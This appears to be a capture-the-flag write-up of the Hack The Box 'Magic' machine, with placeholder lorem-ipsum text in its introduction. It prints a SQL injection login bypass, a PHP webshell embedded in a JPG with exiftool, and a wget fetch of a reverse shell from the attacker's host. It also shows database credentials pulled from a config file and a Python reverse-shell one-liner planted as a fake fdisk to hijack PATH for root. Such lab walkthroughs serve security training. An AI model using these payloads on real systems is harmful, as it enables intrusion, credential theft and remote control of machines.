---
layout: single
title: Magic - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-05-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-magic/magic_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-magic/magic_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. root@nidus:~# nmap -Pn -sC -sV -n 10.10.10.185
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
    |   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
    |_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Magic Portfolio
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB:
    + http://10.10.10.185/index.php (CODE:200|SIZE:4052)
    + http://10.10.10.185/server-status (CODE:403|SIZE:277)

    NIKTO:
    + IP address found in the 'location' header. The IP is "127.0.1.1".
    + Cookie PHPSESSID created without the httponly flag
    + DEBUG HTTP verb may show server debugging information.
    + /login.php: Admin login page/section found.


2. Looking on the webpage we find a few images, however nothing interesting. On login.php we are prompted with username/password.
   There's nothing obvious, no usernames, no passwords. Looking for ways to bypass the login, first thing we should try is SQLi.

    Username: admin'#
    Password: <blank>

   Allows us to bypass the login. We are now prompted with a upload feature.


3. The upload only allows us to upload images. Trying to upload a script or .php-file and changing the mime type through burp is not
   possible. Instead we can create a malicious .jpg-file with embedded code to give us code execution.

   root@nidus:~/Pictures# exiftool -DocumentName="<h1>Player Three Has Entered The Game<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" skull.jpg
    1 image files updated

   root@nidus:~/Pictures# mv skull.jpg skull.php.jpg

   Upload the picture and we can now browse to it: http://magic.htb/images/uploads/skull.php.jpg
   Enumerate the box through the URL by executing the embedded code: http://magic.htb/images/uploads/skull.php.jpg?cmd=whoami
    www-data


4. To get a more stable shell we can upload a reverse php-shell through the webshell.

   Start a listener:
    root@nidus:~/Pictures# nc -lvnp 4488
      listening on [any] 4488 ...

   Setup your HTTP-server:
    root@nidus:/srv/pub-share# python3 -m http.server 8081
      Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...

   Download the reverse-shell:
    http://magic.htb/images/uploads/skull.php.jpg?cmd=wget%2010.10.14.11:8081/rev.php

   Execute the reverse shell and gain a connection:
    http://magic.htb/images/uploads/rev.php

      connect to [10.10.14.11] from (UNKNOWN) [10.10.10.185] 45530
      Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
       12:05:55 up  2:41,  0 users,  load average: 0.00, 0.00, 0.00
      USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
      uid=33(www-data) gid=33(www-data) groups=33(www-data)
      /bin/sh: 0: can't access tty; job control turned off

    $ id
      uid=33(www-data) gid=33(www-data) groups=33(www-data)

    UPGRADE THE SHELL

5. Do standard enumeration with linPEAs.sh and we find a few interesting things.

   MySQL running locally on the box and the password used:
    tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -

    [+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
      ..
      /var/www/Magic/db.php5:    private static $dbUserPassword = 'iamkingtheseus';

  Further investigation of the db-file we find dbName and dbUsername:
    www-data@ubuntu:/tmp$ cat /var/www/Magic/db.php5
    <?php
    class Database
    {
        private static $dbName = 'Magic' ;
        private static $dbHost = 'localhost' ;
        private static $dbUsername = 'theseus';
        private static $dbUserPassword = 'iamkingtheseus';


6. Dump the contents of the database using mysqldump and we find another password.

    www-data@ubuntu:/tmp$ mysqldump Magic -u theseus -p
      Enter password:
      -- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
      --
      -- Host: localhost    Database: Magic
      -- ------------------------------------------------------
      ..
      INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');

    SSH is only possible with public key, so change user with 'su theseus' to grab user.txt and add your public key to authorized_keys

    www-data@ubuntu:/tmp$ su theseus
      Password:
    theseus@ubuntu:~$ id
      uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
    theseus@ubuntu:~$ cat user.txt
      87a9eb3d4c4b7c0a77f9acdf124eed65


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Basic enumeration with linPEAs is sparse, but /bin/sysinfo is readable and stands out from the crowd.

    [+] Readable files belonging to root and readable by me but not world readable
      -rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo


   Running the program give us system information. To know exactly how we dig deeper with strings and find following commands:

    theseus@ubuntu:/bin$ strings sysinfo
      ..
      ====================Hardware Info====================
      lshw -short
      ====================Disk Info====================
      fdisk -l
      ====================CPU Info====================
      cat /proc/cpuinfo
      ====================MEM Usage=====================
      free -h


   Try to run all the command manually and we notice that "fdisk" won't print any output due to low privs. Root is probably needed,
   although this data got printed when executing "sysinfo".


2. Find where fdisk is located using fdisk, to see if we can do some simple PATH hijacking.

    theseus@ubuntu:/dev/shm$ which fdisk
      /sbin/fdisk

    theseus@ubuntu:/dev/shm$ echo $PATH | tr ":" "\n" | nl
       1	/usr/local/sbin
       2	/usr/local/bin
       3	/usr/sbin
       4	/usr/bin
       5	/sbin
       6	/bin
       7	/usr/games
       8	/usr/local/games
       9	/snap/bin

     /sbin is only on position 5, however none of the above directories is writable from Theseus.


3. Modify PATH and place your own, malicious, fdisk program.

    theseus@ubuntu:/dev/shm$ export PATH=/dev/shm:$PATH
    theseus@ubuntu:/dev/shm$ echo $PATH | tr ":" "\n" | nl
     1  /dev/shm
     2	/usr/local/sbin
     3	/usr/local/bin
     4	/usr/sbin
     5	/usr/bin
     6	/sbin
     7	/bin
     8	/usr/games
     9	/usr/local/games
     10	/snap/bin

   theseus@ubuntu:/dev/shm$ cat fdisk
     python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",4499));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


4. Run /bin/sysinfo to trigger your malicious file and get a root-shell.

    theseus@ubuntu:/dev/shm$ /bin/sysinfo

    root@nidus:/opt/shells# nc -lvnp 4499
      listening on [any] 4499 ...
      connect to [10.10.14.11] from (UNKNOWN) [10.10.10.185] 38338
      # whoami
        root
      # cat /root/root.txt
        a69ddb35ff2bf4ada26508463f841344


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Login Bypass
  https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

PATH
  https://www.cyberciti.biz/faq/howto-print-path-variable/
